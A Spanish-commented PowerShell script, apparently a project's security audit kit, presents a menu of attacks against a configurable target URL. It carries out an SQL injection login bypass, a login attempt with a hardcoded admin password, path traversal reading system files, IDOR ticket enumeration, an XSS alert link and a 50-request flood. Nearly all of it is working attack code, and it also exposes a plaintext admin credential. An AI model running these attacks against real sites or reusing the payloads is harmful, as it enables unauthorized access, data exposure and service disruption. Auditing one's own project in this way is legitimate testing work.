# SOFIA EXPLOIT KIT v2.1
# Herramienta de auditoria para la defensa del proyecto

function Show-Header {
    Clear-Host
    Write-Host "##########################################################" -ForegroundColor Green
    Write-Host "#          SOFIA SOLUTIONS - SECURITY AUDIT KIT          #" -ForegroundColor Green
    Write-Host "##########################################################`n" -ForegroundColor Green
}

$targetUrl = "https://sofia-solutions-project.loca.lt" # URL por defecto
Show-Header
$inputUrl = Read-Host "Introduce la URL (Enter para usar: $targetUrl)"
if ($inputUrl -ne "") { $targetUrl = $inputUrl }
if (-not $targetUrl.StartsWith("http")) { $targetUrl = "http://" + $targetUrl }
$targetUrl = $targetUrl.TrimEnd('/')

while ($true) {
    Show-Header
    Write-Host " [OBJETIVO]: $targetUrl" -ForegroundColor Yellow
    Write-Host "`nSELECCIONA UN ATAQUE:"
    Write-Host "1. SQL Injection (Bypass Login)"
    Write-Host "2. Brute Force (Admin)"
    Write-Host "3. Path Traversal (Archivos)"
    Write-Host "4. IDOR (Tickets)"
    Write-Host "5. XSS (Payload)"
    Write-Host "6. Stress Test (DoS)"
    Write-Host "7. Salir"
    Write-Host ""

    $choice = Read-Host "Opcion [1-7]"

    switch ($choice) {
        "1" {
            Write-Host "`n[!] Lanzando SQLi..." -ForegroundColor Cyan
            $body = @{ email = "' OR '1'='1"; password = "hacked" } | ConvertTo-Json
            try {
                $response = Invoke-WebRequest -Uri "$targetUrl/api/auth/login" -Method Post -Body $body -ContentType "application/json" -ErrorAction Stop
                Write-Host "[SUCCESS] Login saltado. Usuario obtenido." -ForegroundColor Green
            } catch { Write-Host "[FAILED] Bloqueado." -ForegroundColor Red }
        }
        "2" {
            Write-Host "`n[!] Lanzando Brute Force..." -ForegroundColor Cyan
            $pass = "S0f1a_Secur3!_2026"
            Write-Host "Probando admin / $pass"
            $body = @{ email = "admin@sofia.local"; password = $pass } | ConvertTo-Json
            try {
                $response = Invoke-WebRequest -Uri "$targetUrl/api/auth/login" -Method Post -Body $body -ContentType "application/json" -ErrorAction Stop
                Write-Host "[SUCCESS] Clave encontrada!" -ForegroundColor Green
            } catch { Write-Host "[FAILED] Fallo." -ForegroundColor Red }
        }
        "3" {
            $file = Read-Host "`nArchivo (ej: ../../../etc/hostname)"
            try {
                $response = Invoke-WebRequest -Uri "$targetUrl/api/files/read?path=$file" -Method Get -ErrorAction Stop
                Write-Host "[SUCCESS] Contenido:`n$($response.Content)" -ForegroundColor Green
            } catch { Write-Host "[FAILED] Bloqueado." -ForegroundColor Red }
        }
        "4" {
            $id = Read-Host "`nID Ticket (ej: 1023)"
            try {
                $response = Invoke-WebRequest -Uri "$targetUrl/api/tickets/view/$id" -Method Get -ErrorAction Stop
                Write-Host "[SUCCESS] Datos expuestos: $($response.Content)" -ForegroundColor Green
            } catch { Write-Host "[FAILED] Bloqueado." -ForegroundColor Red }
        }
        "5" {
            Write-Host "`n[!] Link XSS generado:" -ForegroundColor Cyan
            Write-Host "$targetUrl/vulnerable/search?q=<script>alert('HACKED')</script>"
        }
        "6" {
            Write-Host "`n[!] Iniciando DoS..." -ForegroundColor Red
            for($i=0; $i -lt 50; $i++) {
                Invoke-WebRequest -Uri "$targetUrl/api/health" -Method Get -ErrorAction SilentlyContinue | Out-Null
                Write-Host "." -NoNewline
            }
            Write-Host "`n[FIN] 50 peticiones enviadas." -ForegroundColor Green
        }
        "7" { break }
    }
    Read-Host "`nEnter para volver..."
}

